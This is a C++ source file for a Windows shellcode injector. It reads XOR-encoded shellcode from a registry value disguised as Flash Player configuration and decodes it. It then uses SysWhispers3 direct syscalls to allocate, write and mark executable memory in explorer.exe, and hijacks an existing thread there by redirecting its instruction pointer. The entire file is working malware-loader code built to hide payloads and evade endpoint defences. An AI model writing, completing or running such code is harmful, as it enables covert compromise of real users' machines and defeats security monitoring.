// injector.cpp
// Thread-hijack shellcode injector using SysWhispers3 (jumper_randomized).
// - Shellcode is read from HKCU\Software\Macromedia\FlashPlayer\Config (REG_BINARY)
// - The registry value contains the shellcode XOR'd with 0x6B (done by PowerShell)
// - We XOR again with 0x6B to recover the original shellcode
// - We hijack an existing thread in explorer.exe (no CreateRemoteThread)

#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <vector>

#include "syscalls.h"

#pragma comment(lib, "advapi32.lib")

// -----------------------------------------------------------------------------
// Config
// -----------------------------------------------------------------------------
#define XOR_KEY             0x6B
#define REG_SUBKEY          L"Software\\Macromedia\\FlashPlayer"
#define REG_VALUE_NAME      L"Config"
#define TARGET_PROCESS      L"explorer.exe"

// -----------------------------------------------------------------------------
// Read the XOR'd shellcode from the registry
// -----------------------------------------------------------------------------
static std::vector<BYTE> ReadShellcodeFromRegistry()
{
    std::vector<BYTE> shellcode;
    HKEY hKey = nullptr;

    LONG rc = RegOpenKeyExW(HKEY_CURRENT_USER, REG_SUBKEY, 0, KEY_READ, &hKey);
    if (rc != ERROR_SUCCESS) {
        wprintf(L"[-] RegOpenKeyExW failed (rc=%ld, err=%lu)\n", rc, GetLastError());
        return shellcode;
    }

    DWORD type = 0;
    DWORD size = 0;
    rc = RegQueryValueExW(hKey, REG_VALUE_NAME, nullptr, &type, nullptr, &size);
    if (rc != ERROR_SUCCESS || type != REG_BINARY || size == 0) {
        wprintf(L"[-] RegQueryValueExW (size) failed (rc=%ld, type=%lu, size=%lu)\n",
                rc, type, size);
        RegCloseKey(hKey);
        return shellcode;
    }

    shellcode.resize(size);
    rc = RegQueryValueExW(hKey, REG_VALUE_NAME, nullptr, nullptr, shellcode.data(), &size);
    if (rc != ERROR_SUCCESS) {
        wprintf(L"[-] RegQueryValueExW (data) failed (rc=%ld)\n", rc);
        shellcode.clear();
    }

    RegCloseKey(hKey);
    return shellcode;
}

// -----------------------------------------------------------------------------
// Helpers: toolhelp snapshot enumeration
// -----------------------------------------------------------------------------
static DWORD FindTargetProcessId(const wchar_t* processName)
{
    DWORD pid = 0;
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;

    PROCESSENTRY32W pe{};
    pe.dwSize = sizeof(pe);
    if (Process32FirstW(snap, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, processName) == 0) {
                pid = pe.th32ProcessID;
                break;
            }
        } while (Process32NextW(snap, &pe));
    }
    CloseHandle(snap);
    return pid;
}

static DWORD FindTargetThreadId(DWORD pid)
{
    DWORD tid = 0;
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;

    THREADENTRY32 te{};
    te.dwSize = sizeof(te);
    if (Thread32First(snap, &te)) {
        do {
            if (te.th32OwnerProcessID == pid) {
                tid = te.th32ThreadID;
                break;
            }
        } while (Thread32Next(snap, &te));
    }
    CloseHandle(snap);
    return tid;
}

// -----------------------------------------------------------------------------
// Entry point
// -----------------------------------------------------------------------------
int wmain()
{
    // SysWhispers3 "jumper_randomized" uses rand() inside SW3_GetRandomSyscallAddress.
    // Seed it so the syscall stub selection is actually randomized.
    srand((unsigned int)time(nullptr) ^ GetTickCount());

    wprintf(L"[*] Reading shellcode from HKCU\\%s\\%s\n", REG_SUBKEY, REG_VALUE_NAME);

    std::vector<BYTE> shellcode = ReadShellcodeFromRegistry();
    if (shellcode.empty()) {
        wprintf(L"[-] No shellcode recovered from registry.\n");
        return 1;
    }
    wprintf(L"[+] Recovered %zu bytes (still XOR-encoded).\n", shellcode.size());

    // XOR-decode (PowerShell pre-XOR'd with 0x6B before writing to the registry).
    for (auto& b : shellcode) b ^= XOR_KEY;
    wprintf(L"[+] Shellcode decoded (XOR 0x%02X).\n", XOR_KEY);

    // Basic sanity check: x64 shellcode usually starts with a prologue or a call.
    // Not mandatory, just informational.
    wprintf(L"[i] First bytes: %02X %02X %02X %02X\n",
            shellcode[0],
            shellcode.size() > 1 ? shellcode[1] : 0,
            shellcode.size() > 2 ? shellcode[2] : 0,
            shellcode.size() > 3 ? shellcode[3] : 0);

    // -------------------------------------------------------------------------
    // Locate target process
    // -------------------------------------------------------------------------
    DWORD pid = FindTargetProcessId(TARGET_PROCESS);
    if (pid == 0) {
        wprintf(L"[-] Target process '%s' not found.\n", TARGET_PROCESS);
        return 1;
    }
    wprintf(L"[+] Target process: %s (PID=%lu)\n", TARGET_PROCESS, pid);

    OBJECT_ATTRIBUTES oa;
    InitializeObjectAttributes(&oa, nullptr, 0, nullptr, nullptr);

    // -------------------------------------------------------------------------
    // NtOpenProcess (direct syscall)
    // -------------------------------------------------------------------------
    HANDLE hProcess = nullptr;
    CLIENT_ID cid = {};
    cid.UniqueProcess = (HANDLE)(ULONG_PTR)pid;
    cid.UniqueThread  = nullptr;

    NTSTATUS status = Sw3NtOpenProcess(
        &hProcess,
        PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ | PROCESS_QUERY_INFORMATION,
        &oa,
        &cid);

    if (status < 0 || hProcess == nullptr) {
        wprintf(L"[-] Sw3NtOpenProcess failed: 0x%08X\n", (unsigned)status);
        return 1;
    }
    wprintf(L"[+] Process handle: 0x%p\n", hProcess);

    // -------------------------------------------------------------------------
    // NtAllocateVirtualMemory (direct syscall)
    // -------------------------------------------------------------------------
    PVOID remoteBase = nullptr;
    SIZE_T regionSize = shellcode.size();
    status = Sw3NtAllocateVirtualMemory(
        hProcess,
        &remoteBase,
        0,
        &regionSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE);

    if (status < 0 || remoteBase == nullptr) {
        wprintf(L"[-] Sw3NtAllocateVirtualMemory failed: 0x%08X\n", (unsigned)status);
        Sw3NtClose(hProcess);
        return 1;
    }
    wprintf(L"[+] Allocated %zu bytes at 0x%p\n", regionSize, remoteBase);

    // -------------------------------------------------------------------------
    // NtWriteVirtualMemory (direct syscall)
    // -------------------------------------------------------------------------
    SIZE_T bytesWritten = 0;
    status = Sw3NtWriteVirtualMemory(
        hProcess,
        remoteBase,
        shellcode.data(),
        shellcode.size(),
        &bytesWritten);

    if (status < 0 || bytesWritten != shellcode.size()) {
        wprintf(L"[-] Sw3NtWriteVirtualMemory failed: 0x%08X (written=%zu)\n",
                (unsigned)status, bytesWritten);
        Sw3NtClose(hProcess);
        return 1;
    }
    wprintf(L"[+] Wrote %zu bytes.\n", bytesWritten);

    // -------------------------------------------------------------------------
    // NtProtectVirtualMemory -> RX (direct syscall)
    // -------------------------------------------------------------------------
    ULONG oldProtect = 0;
    status = Sw3NtProtectVirtualMemory(
        hProcess,
        &remoteBase,
        &regionSize,
        PAGE_EXECUTE_READ,
        &oldProtect);

    if (status < 0) {
        wprintf(L"[-] Sw3NtProtectVirtualMemory failed: 0x%08X\n", (unsigned)status);
        Sw3NtClose(hProcess);
        return 1;
    }
    wprintf(L"[+] Protection changed to PAGE_EXECUTE_READ.\n");

    // -------------------------------------------------------------------------
    // Find an existing thread to hijack
    // -------------------------------------------------------------------------
    DWORD tid = FindTargetThreadId(pid);
    if (tid == 0) {
        wprintf(L"[-] No thread found in PID=%lu.\n", pid);
        Sw3NtClose(hProcess);
        return 1;
    }
    wprintf(L"[+] Target thread: TID=%lu\n", tid);

    HANDLE hThread = nullptr;
    cid.UniqueProcess = (HANDLE)(ULONG_PTR)pid;
    cid.UniqueThread  = (HANDLE)(ULONG_PTR)tid;

    status = Sw3NtOpenThread(
        &hThread,
        THREAD_SUSPEND_RESUME | THREAD_GET_CONTEXT | THREAD_SET_CONTEXT | THREAD_QUERY_INFORMATION,
        &oa,
        &cid);

    if (status < 0 || hThread == nullptr) {
        wprintf(L"[-] Sw3NtOpenThread failed: 0x%08X\n", (unsigned)status);
        Sw3NtClose(hProcess);
        return 1;
    }
    wprintf(L"[+] Thread handle: 0x%p\n", hThread);

    // -------------------------------------------------------------------------
    // Suspend thread, patch RIP, resume -> shellcode runs in-thread
    // -------------------------------------------------------------------------
    ULONG prevSuspend = 0;
    status = Sw3NtSuspendThread(hThread, &prevSuspend);
    if (status < 0) {
        wprintf(L"[-] Sw3NtSuspendThread failed: 0x%08X\n", (unsigned)status);
        Sw3NtClose(hThread); Sw3NtClose(hProcess);
        return 1;
    }
    wprintf(L"[+] Thread suspended (prev count=%lu).\n", prevSuspend);

    CONTEXT ctx{};
    ctx.ContextFlags = CONTEXT_FULL;
    status = Sw3NtGetContextThread(hThread, &ctx);
    if (status < 0) {
        wprintf(L"[-] Sw3NtGetContextThread failed: 0x%08X\n", (unsigned)status);
        Sw3NtResumeThread(hThread, &prevSuspend);
        Sw3NtClose(hThread); Sw3NtClose(hProcess);
        return 1;
    }
    wprintf(L"[+] Original RIP: 0x%p\n", (PVOID)ctx.Rip);

    // Redirect execution to our shellcode.
    ctx.Rip = (DWORD64)remoteBase;
    status = Sw3NtSetContextThread(hThread, &ctx);
    if (status < 0) {
        wprintf(L"[-] Sw3NtSetContextThread failed: 0x%08X\n", (unsigned)status);
        Sw3NtResumeThread(hThread, &prevSuspend);
        Sw3NtClose(hThread); Sw3NtClose(hProcess);
        return 1;
    }
    wprintf(L"[+] RIP redirected to 0x%p.\n", remoteBase);

    status = Sw3NtResumeThread(hThread, &prevSuspend);
    if (status < 0) {
        wprintf(L"[-] Sw3NtResumeThread failed: 0x%08X\n", (unsigned)status);
        Sw3NtClose(hThread); Sw3NtClose(hProcess);
        return 1;
    }

    wprintf(L"[+] Thread resumed. Shellcode is now executing inside %s.\n", TARGET_PROCESS);

    // Give it a moment before we tear down our own process.
    Sleep(2000);

    Sw3NtClose(hThread);
    Sw3NtClose(hProcess);

    wprintf(L"[+] Done.\n");
    return 0;
}
